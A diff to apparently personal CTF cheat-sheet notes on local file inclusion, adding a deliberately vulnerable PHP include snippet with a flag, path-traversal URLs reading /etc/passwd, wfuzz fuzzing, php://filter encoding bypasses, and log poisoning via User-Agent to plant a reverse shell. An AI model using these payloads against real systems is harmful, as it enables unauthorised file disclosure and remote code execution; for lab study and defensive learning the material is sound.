@@ -2,12 +2,39 @@
 title: LFI 🎃
 ---
 
+## Classic ones
+
+- If you find the php code with the filter like:
+
+```php
+        <?php
+
+	    //FLAG: thm{explo1t1ng_lf1}
+
+            function containsStr($str, $substr) {
+                return strpos($str, $substr) !== false;
+            }
+	    if(isset($_GET["view"])){
+	    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
+            	include $_GET['view'];
+            }else{
+
+		echo 'Sorry, Thats not allowed';
+            }
+	}
+        ?>
+```
+
+- You can just apply a filter like: `http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//../etc/passwd`
+
+## Adding parameter file to url
+
 - Linux File Inclussion
   - Check the `url` adding parameter `file`
 
 ![](Pasted%20image%2020240213235821.png)
 
----
+## Fuzzing it
 
 - FUZZ it using this command:
   - [Useful wordlist found here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/)
@@ -16,17 +43,26 @@ title: LFI 🎃
 wfuzz -c -w dirTraversal.txt  --hw 0 http://10.10.70.109/?view=FUZZ
 ```
 
----
+
+## Bypassing filters with encodings
+
 
 - If the backend is filtering by checking the input, try this:
 
 ```shell
 http://IP/?view=php://filter/FOLDER/convert.base64-encode/resource=index
+
+# example
+http://mafialive.thm/test.php?view=//filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php
 ```
 
 - Check out the &ext variable and put it empty because it won't get the file extension
 
----
+## Log poisoning
+
+- To perform this, first check out if you have access to the log file in an apache with Burpsuite:
+
+
 
 - Log file contamination
 
@@ -34,7 +70,8 @@ http://IP/?view=php://filter/FOLDER/convert.base64-encode/resource=index
 http://IP/?view=dog../../../../../cat/../var/log/apache2/access.log&ext=
 ```
 
----
+
+## Exploiting the User-Agent field
 
 - Exploit the User-Agent Field:
   - First create a shell like the PentestMonkey one
@@ -48,7 +85,7 @@ http://IP/?view=dog../../../../../cat/../var/log/apache2/access.log&ext=
 
 - Then access to `http://IP/shell.php` and you got the reverse shell
 
----
+## Regex filtering
 
 When we can echo commands try and it's using a regex like: `/[#!@%^&*()$_=\[\]\';,{}:>?~\\\\]/` try:
 
